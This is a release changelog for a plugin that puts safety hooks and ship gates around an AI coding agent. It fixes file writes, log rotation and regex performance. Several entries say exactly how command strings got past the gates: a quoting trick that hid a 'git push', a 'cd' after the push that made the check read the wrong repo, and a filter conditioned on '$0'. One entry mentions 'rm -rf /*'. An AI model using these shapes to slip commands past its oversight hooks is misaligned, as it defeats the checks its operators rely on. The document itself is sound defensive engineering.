- **`/claudemd-clean-residue` now reports `tmp.XXXXXXXXXX`.** Its `$TMPDIR` pass matched on the `claudemd-` prefix, and a bare `mktemp -d` produces the default shape — so the largest class of residue this project's own tests produced never appeared in the report. Measured on the maintainer's box: **2.6 GB across 524 directories, 150-250 new ones a day** (audit R11-38). Every run now **counts and sizes** that class; nothing deletes it. The name shape is matched exactly (`tmp.` + ten alphanumerics), so a hand-made `tmp.backup` stays out of scope. A `--include-unowned` delete flag was in this release until the pre-tag review: where those entries actually lived — `~/.claude/tmp/claude-<uid>`, which the Claude Code sandbox hands out as `$TMPDIR` — the existing `~/.claude/tmp` retention pass already reaps every depth-1 child by age, so the flag added no reach there, and in a shared `/tmp` it would have deleted other programs' live work. Counting is the fix; the flag was withdrawn.
- **`--retention-days` has a floor of 1, and the cleaner will not delete the tree it is running in.** `~/.claude/tmp/claude-<uid>` holds every live session's scratchpad — under the sandbox, its bridge socket too — so a zero-day window is not "clean everything", it is "kill every running session". `0` had been accepted since v0.71.3 (only negatives were rejected), from the flag *and* from `TMP_RETENTION_DAYS:` in whichever project's `CLAUDE.md` you happen to be standing in. It is now rejected loudly at the flag, warned-and-defaulted from `CLAUDE.md`, and clamped in the library. Separately, any stale entry that contains the process's own cwd or `$TMPDIR` is skipped and listed under `protected`, whatever the window says — env seams cannot protect the scope the caller did not override, so the deleter has to recognise the branch it is sitting on. This is not hypothetical: during the pre-tag review, `--retention-days=0 --apply` with only `$TMPDIR` redirected removed every session scratchpad on the maintainer's machine, the reviewer's own fixture and working directory included.
...
The last two are `fix:` under §2's exclusion for restoring documented behaviour — `doctor`'s own ADVISORY comment and `uninstall`'s own USAGE already said what should happen. The retention floor is the same shape: `clean-residue`'s own comment said an unowned entry "may belong to a process still running" and named the window as the safeguard, while the code accepted a window of zero.
...
`tests/lib/mktemp-template.sh` (any tracked `.sh` whose `mktemp` call has no template), an extractor control for `subject-set-drift` (the v0.69.0 pre-tag review ran it once by hand and it was never encoded — under a broken `canon()` every file reads as "derived" and the gate passes over nothing), consumer-enumeration gates for each extraction above, and regression tests for all five small fixes. Every behaviour commit ships RED controls run in a full-tree copy: **26 mutations, 26 RED** as recorded in the commit bodies, each verified by checksum to have landed.

### Pre-tag review fold (same release)

The fresh-subagent review before the tag returned 1 HIGH / 4 MEDIUM / 3 LOW; all are folded in here rather than shipped as a follow-up. Besides the two user-visible items above: `scan()`'s two early returns were missing the `unowned` key, so a missing or unreadable `$TMPDIR` was a `TypeError` instead of an empty report (HIGH); `lint-argv`'s new preceding-line suppression accepted `argv-lint:allow` *anywhere* in the comment above, so a sentence explaining the convention silenced the code under it — the token must now open the comment (MEDIUM); the `mktemp` gate judged whole lines after stripping only full-line comments, so `D=$(mktemp -d) # …XXXXXX` passed and `$( mktemp` was not a call — it now judges each call up to its closing paren (MEDIUM, LOW); and that gate had no control in the tree, which is what this release said it was fixing for the other one — `tests/scripts/mktemp-template-gate.test.js` now drives it against fixture checkouts through a `MKTEMP_GATE_ROOT` seam (MEDIUM). `package-lock.json` had shipped at 0.71.3 with `version-cascade-check` green: both of its version sites are now in the check (LOW). Three numbers in this entry and one in the gate's header were corrected against tool output rather than memory.
...
The two rounds differ in kind. The first fixed code that **wrote the user's files wrong**. The second fixed **gates that were passing when they should not have been** — and none of the three emitted telemetry while doing it, so nothing in the logs distinguished a clean repo from a gate that had stopped looking.

### User-visible

- **`claudemd-cli audit <unreadable-file>` exits 2, not 1.** `existsSync` and `statSync` both succeed on a mode-000 file, so the read fell through to a bare `readFileSync` and exited 1 with a V8 stack. Exit 1 is the documented "hits found" code, so a CI job gating on it read a permission error as a banned-vocab hit. The USAGE block has promised `2 = usage error` since the CLI shipped, and the sibling `lint --file` path has done this since v0.9.x.
- **`/claudemd-uninstall` no longer purges by default.** The slash-command stub labelled `CLAUDEMD_PURGE=1 node uninstall.js` as its *default* invocation, while README and `uninstall.js` both treat purge as opt-in. An agent following the stub deleted `~/.claude/logs/claudemd.jsonl` — the §13.1 demote-review corpus, not recoverable — on what the other two sources call the default path. The stub now matches the script; README was already right. A new `purge-default-drift` gate joins the stub's first invocation to the script's env check, deriving the variable name from `uninstall.js` rather than repeating it.

Both are `fix:` under §2's exclusion for restoring documented behaviour, not `change:`.

### Round 1 — writes into `~/.claude`

- **`settings.json` keeps its mode and its symlink.** `writeSettings` used `writeFileSync` + `rename`, so a 0600 settings.json came back **0664** on a umask-002 box, and a `~/.claude/settings.json -> dotfiles/settings.json` setup was replaced by a regular file with the dotfiles copy frozen on old content. That file's `env` block is where an `ANTHROPIC_API_KEY` lives. `paths.js#writeJsonAtomic` is now the single writer for every JSON file this plugin puts in the user's home: realpath through the link first (rename cannot cross filesystems), carry the existing mode forward, chmod after the write because `writeFileSync`'s mode is umask-masked, unlink the tmp on failure. It replaces two hand-copied tmp+rename forms — neither of which did either thing — and two plain `writeFileSync` call sites (the install manifest and the legacy-manifest migration) that were not atomic at all.
- **install writes `settings.json` only when eviction removed something** — steady state has been `removed=0` since v0.1.5, yet every version-mismatch SessionStart fired a background install that rewrote the file anyway, re-ordering keys, stripping the BOM, and racing Claude Code's own writes for no gain. The manifest write is atomic for the same reason a torn one reads back as "not installed" and spawns another install.
- **`pruneCache` is gated on location, not on name shape.** Its only guard was `SEMVER_RE` on `basename(pluginRoot)`, which constrains a *name* and says nothing about *where* the scan happens — pointed at a `git worktree add ../0.70.0` or a version-named checkout, it `rm -rf`'d the siblings. `pluginCacheDir()` had been exported the whole time and nothing had ever consulted it *as a guard* (`status.js` read it to build the cache-present hint). The guard is `startsWith`, not equality: production is `cache/claudemd/claudemd/<version>`, so the versions dir sits one level *below* `pluginCacheDir()` and an equality check — which reads stricter — would have turned pruning off permanently while every existing test stayed green.
- **The rotated rule-hits log is read.** `rule-hits.sh` has rotated `claudemd.jsonl` to `.1` and `.2` at 5 MB since v0.9.x and no JS reader had ever opened one: a grep for `jsonl\.1` across `scripts` and `bin` found a single comment. At ~26 KB/day the first rotation was **~68 days out**, and on that day the primary file is near-empty — `memory-maintenance`'s 90-day liveness set would have reported every durable memory as unmentioned, indistinguishable from a genuinely quiet 90 days. Fixed inside `readLogRows`, so `readHits` / `logFirstTs` / `detectCutover` and the five scripts downstream are covered by one change and no output field is added. Coverage after this is roughly 590 days.
- **`version-sync`'s "once per session" sentinel is keyed on the session.** `CLAUDE_SESSION_ID` is not exported to hooks — **628 of 704** live `user-prompt-submit` rows carry `session_id:null`, and `$TMPDIR` held **96** sentinels. Keyed on `$PPID` it ran once per *prompt*: a `find` plus two `jq` spawns every time, a `stale-root` row every time, and a fresh 10s background install every time until the manifest caught up. The event JSON carries `session_id`; it is now read the way three sibling hooks already read it, with `$PPID` as the fallback. The test suite exported `CLAUDE_SESSION_ID`, so all nine existing cases ran against a shape production never has.
- **Two super-linear regexes bounded.** `HAS_NUMERIC_ARROW` is quadratic and `EVIDENCE_FINGERPRINT`'s arrow clause cubic on a plain digit run — no adversary needed, a lockfile or hash dump reaches them. One `.test()` call:

  | digits | `HAS_NUMERIC_ARROW` | `EVIDENCE_FINGERPRINT` |
  |---:|---|---|
  | 2,000 | 4.2ms → 0.4ms | 2,648ms → 0.4ms |
  | 5,000 | 25.0ms → 0.8ms | 40,503ms → 0.8ms |
  | 20,000 | 468ms → 3.3ms | no return → 3.3ms |
  | 60,000 | — → 9.9ms | — → 9.7ms |

  Both linear after. The `+` in `[0-9]+[^\s]*` was already redundant since `[^\s]` includes digits; the only real narrowing is a 64-character cap, far past any anchor §10 accepts.

### Round 2 — gates that were passing

- **The new `lint` chain was ordered so two ship gates sat behind a known-red step** — caught inside this release, not shipped. `npm run lint`, `lint:js` and eslint arrive here for the first time (there was no `lint` script in 0.71.3); the first cut ordered it `lint:sh && lint:js && lint:argv && version-check`, and since `lint:js` is red at its 30-error baseline, `&&` meant `lint:argv` and `version-check` would never have run from that entry point. Reordered before release, with a test that asserts the order from the chain string so it cannot silently regress. `lint:argv` and `version-check` were exactly as reachable in 0.71.3 as they are now — this is a defect in new code, prevented, not a user-facing fix.
- **`ship-baseline-check` judges the repo being pushed.** `TRIGGER_RE` has accepted `git -C <dir> push` since R10-05 and `hook_read_telemetry_ids` has returned the event cwd since v0.9.34, but every `git` and `gh` call below them ran bare in the hook's own cwd — so the HARD §7 gate read repo A's branch, CI colour and HEAD message to decide about a push to repo B. A green + B red is a silent false pass. Target resolution is `-C <dir>`, then a leading `cd <dir>`, then the event cwd; anything that is not a real worktree falls back to the hook's cwd, because this is a deny gate and the fix must not make it newly block.
- **`hook_trigger_view` strips quotes with one state machine.** It used two chained seds — the exact pair `pre-bash-safety-check.sh` replaced in v0.47.1, for the reason documented there: single- and double-quote context are mutually exclusive in the shell, so two passes that each ignore the other's pair the closing quote of one region with the opening quote of the next. `grep 'a"b' f && git push origin main && grep 'c"d' g` collapsed to `grep '' g;` — the push invisible to all three consumers (ship-baseline §7, memory-read-check §11, banned-vocab Path 2), none of them emitting a bypass row.
- **The spec trio lands all-or-nothing.** `install.js` verified each copy's sha256; `update.js` ran a bare `copyFileSync` loop with neither check nor rollback. Since `createBackup` *renames* the originals away, an ENOSPC on the second file left `~/.claude` holding one new file and three missing — the partial state `update.js:37-39` forbids, because §EXT cross-references dangle. `spec-hash.js#copySpecFiles` is now the single path: verify, and on any failure restore every name from the backup before rethrowing.
- Two small ones: the legacy-manifest migration writes atomically (a partial write left a truncated manifest shadowing an intact legacy file, and `readManifest` prefers the new path — permanent `data: null`), and `status.js` sorts cache versions with `semverCmp` instead of a lexicographic `.sort()` that put `0.10.0` and `0.71.3` before `0.9.0`.

### Verification

Every one of the ten items ran a control: the pre-fix source restored into a **full-tree copy**, never `git checkout`, with the new assertions run against it. All ten controls came back red, and the report records what each one printed — `grep '' g;` for the swallowed push, `CLAUDE.md must be restored, not left missing` for the spec rollback, `new_sentinels=2 expected 1` for the session key, and a `got:` that was simply empty for the ship gate's silent false pass.

`npm test` 873 → **916** pass / 0 fail across the node suites (both counts measured in a git worktree at the release commit, not in a `git archive` copy — several tests shell out to git and a non-repo tree fails six of them); `OVERALL: all suites passed` including the bash suites. shellcheck 62 files clean. Import cycles 0. eslint unchanged at its 30-error baseline — no new errors across either round. Long functions 38 → 39, measured against `dd55944` (this release's own tooling commit, the baseline `docs/audit/00-baseline.md` records); against the 0.71.3 tag it is 37 → 39, the extra one being `baseline-metrics.js#coverage` in that same new script. The single addition either way is `pruneCache`, which crossed 50 lines at 54 — about 20 of them the comment explaining why the guard is `startsWith`.

Three test-instrument faults were caught by those controls rather than shipped, all of them the same shape — the instrument reported a state that had no causal link to the thing it claimed: a timing gate that **hung instead of failing** (two regexes sharing a 20k input, the cubic one never returning, so `node --test` timed out); a failure injected by `chmod 000` that threw in the diff phase **before** the backup ran, so "everything was restored" held against unfixed code; and a mock keyed on the destination path that intercepted the **rollback's** copy and re-broke the file it had just restored.

### What the pre-tag review changed

An independent review reproduced one **BLOCKER** in the first cut of this release, in the same file whose fix is listed above, and in the direction that fix's own comment did not consider.

`ship-baseline-check.sh`'s new target resolution scanned the whole command for a `cd` and took the last one with `tail -n1`. The comment said "last cd wins, matching what the shell would do" — but the shell runs the push *before* a `cd` that follows it. So `git push origin main && cd ../sibling && npm test`, an ordinary shape, made the HARD §7 gate read `../sibling`'s branch, CI colour and HEAD commit body to adjudicate a push to the current repo. **Both** exemption inputs the gate reads could be sourced from an unrelated repository named after the fact, and the failure direction is a silent ALLOW of a red-CI push. Every one of those cases denied at 0.71.3; it was strictly new. The `cd` scan is now bounded to the text preceding the matched push segment, and the branch has tests in both directions — a `cd` after the push must not select the target, a `cd` before it must.

The gap was structural rather than subtle: cases 42/43/44 covered the `-C <dir>` branch and the unresolvable fall-through, and **nobody wrote a test for the `cd` branch at all**. The author's documented failure mode is gates that cannot fail; this release's new gates all could — twelve mutants, twelve red — and the defect landed instead in a branch with no gate pointed at it.

Four more fixes and four corrections came out of the same review:

- A fresh install stopped creating `~/.claude/settings.json`. Making the write conditional on eviction meant a machine with no prior file never got one, and `doctor.js:140` counts a missing settings.json as a **failing** check — `/claudemd-doctor` was red out of the box and its §4 routing check, guarded on the file existing, was skipped.
- `install.js` took a backup and did not pass it to `copySpecFiles`, so the install path kept the exact data-loss shape the update path just closed — on the branch that `renameSync`s the user's **personal** `CLAUDE.md` away, where the content at risk is theirs rather than a re-copyable shipped spec.
- `copySpecFiles` recorded a name as written *after* the copy, so a copy that threw partway left a truncated file in neither the written list nor the backup — the rollback neither restored nor removed it, defeating the all-or-nothing claim.
- `writeJsonAtomic` wrote the payload at umask mode and chmod'd after, leaving the `env` block at 0664 on disk for the length of the write; and `realpathSync` throws on a **dangling** symlink, so a dotfiles target not yet checked out was still replaced by a regular file — the precise case the fix advertises closing.
- Corrections, all of them claims that did not survive checking: `pluginCacheDir()` did have a caller (`status.js`, for the cache-present hint) though never as a guard; two of the four converted call sites were plain `writeFileSync` rather than tmp+rename; the long-function delta is measured against this release's own tooling commit, not the tag; and `rule-hits.sh`'s documented acceptance of an archive-rotation race rests on "no consumer reads the archives", which this release made false — flagged in place for re-adjudication rather than quietly left standing.

Everything else the review was asked to falsify reproduced, including the two most likely to drift: the regex timings (its own measurements: 2k old-cubic 2,672ms against the table's 2,648; 20k old-cubic still not returning at 60s) and 628-of-704 `session_id:null`, now 636 of 712 with a further 76 omitting the field — **0 of 712** carrying a real session id. The quote state machine was put through 95,433 differential cases against the two seds it replaces; the 103 divergences were then run under real bash with an instrumented `git`, and in **none** of them did the shell actually execute the push — the old view was showing a push that never runs.

## [0.71.3] - 2026-09-01

**No user-visible behaviour changes.** The 0.71.2 pre-tag review left three escapes recorded rather than fixed; two of them are closed here. Spec unchanged at **v6.25.4**.

Both were the same shape as the release they came out of — a gate that reads a spelling where the defect is a behaviour — one level in. 0.71.2 fixed how `spec-status-drift` chooses which specs to judge; it did not touch how it decides whether a declared artifact is in the tree. 0.71.2 made `shared-scope-consumers` read every *caller* of the shared shellcheck scope; nothing read what the *callee* answered.

### Internal

- **`spec-status-drift` judges a definition, not a mention.** `- Produces:` claims the spec *creates* the thing, and presence was tested with `\bname\b` against the whole tracked tree — so a draft declaring `cache` and `resolve` was condemned as stale (both words appear in dozens of files) while an artifact that landed under a different name read as absent, silencing the spec for good. Presence now requires a definition site: `name() {`, `function name`, `const|let|var name =`, a shell assignment with its `readonly|local|export|declare` prefixes, or a JSON key; a name that parses as a filename is looked up in the tracked file set first, whatever its extension. `s8_split_segments`, `s8_strip_wrappers`, `S8_WRAP_ARGLESS` and `CURLSH_WRAP` — the symbols the gate was written for — still match.
- **How much of the collision class that actually closes, measured rather than illustrated:** of 48 plausible generic names a draft might declare, all 48 are mentioned in the tree and **40 still resolve to a definition** (`hook`, `status`, `name`, `count`, `report`, `run`, `version`, …). Eight drop out — `cache`, `resolve`, `linkage`, `saturation`, `value`, `state`, `config`, `item`. So this narrows the class, it does not close it: a name this repo really does define is a genuine ambiguity in the declaration, and the failure message says so. The two-artifact minimum remains the thing standing between a generic name and a false verdict.
- The all-or-nothing verdict is split into present/missing, and **every** open spec with anything missing is printed with the missing artifacts named — including `0/2 present`. Partial work is not a failure; an open status is supposed to mean exactly that. But a renamed helper no longer takes the whole spec out of the gate's reach with nothing saying so, and a verdict of "none of it landed" is a verdict rather than silence.
- The block-comment gap the same review filed as latent went with it, in `.js`/`.mjs` only: `.sh` is left alone because `/*` is a glob there (`rm -rf /*`) and eating to the next `*/` would delete real definitions. The opener must be a whole line, not a `/*` found anywhere in one — see below for what the unanchored version cost.
- Six cases drive that predicate, because all seven tracked specs are implemented or rejected today: the open subset is empty and both tree assertions are vacuous, so the rules would otherwise first be exercised on the day they are relied on. Five are fixtures calling the same functions the scan calls, with one line per definition shape — a shape no fixture drives can be deleted with the suite still green. The sixth is tree-anchored and is the only non-vacuous assertion in the file: every `export function` across the tracked scripts (**110** across 36 files today) must be findable in the haystack the gate searches.
- **`shared-scope-consumers` now compares the shellcheck scope as a set** — what `tests/lib/shell-files.sh` prints against `git ls-files '*.sh'` — because the three existing tests all ask whether the single source is *consulted* and none asks what it returned. Two `grep -v` lines inside `shell_files_checked_scope()` narrowed every consumer at once with all of them green; the floor inside the script does not catch it either, since the deliberate headroom (40 against 62) leaves room to drop a directory. The script is invoked by a relative path, the way `ci.yml` and `run-all.sh` invoke it, so a filter conditioned on `$0` cannot answer the gate one way and the two real callers another. The floor is parsed out of the script rather than written again in JS. Scoped to that one file by name: the sibling `bash32-constructs.sh` filters its default scope by design, so "unfiltered" is the wrong invariant for it.
- Each change was verified against mutants in a tree copy, each chosen so that it turns the specific predicate false rather than merely perturbing the source. `npm test` 867 → 873 pass / 0 fail.

### What the pre-tag review changed

An independent review reproduced two HIGH regressions in the first cut of this release, both against 0.71.2 rather than against the state before it, and both silent:

- The block-comment stripper was **unanchored**, and `// Scans ~/.claude/projects/*/memory/…` contains a `/*`. The region ran to the next `*/` — another glob 175 lines later — and 10 of the 110 exported functions in this repo disappeared from the haystack, `classifyTag` and `scanVocab` among them. A spec declaring work that shipped long ago was caught by 0.71.2 and passed silently by this. Anchoring the opener and closer to whole lines restores 110/110; reordering the two passes does not, because a `/*` inside a string literal opens the same runaway.
- Produced files whose extension was not `.sh/.js/.mjs/.tsv` — `hard-rules.json`, `banned-vocab.patterns`, `ci.yml`, all really shipped here — were routed to the *symbol* branch and read as missing. The old mention-based predicate found them by their paths appearing in code.

Both were invisible rather than loud because a spec with *nothing* present printed no line at all, which is why every judged spec now prints its verdict. The review also deleted two of the five definition shapes with all six tests still green — the predicate's reach over this tree collapsing from 110/110 to 6/110 while the suite said nothing — and escaped the new scope test with a filter conditioned on `$0`. Both are cases here now. The tree-anchored test above exists because every fixture supplies its own code string and so none of them can see a haystack that has stopped containing the code.
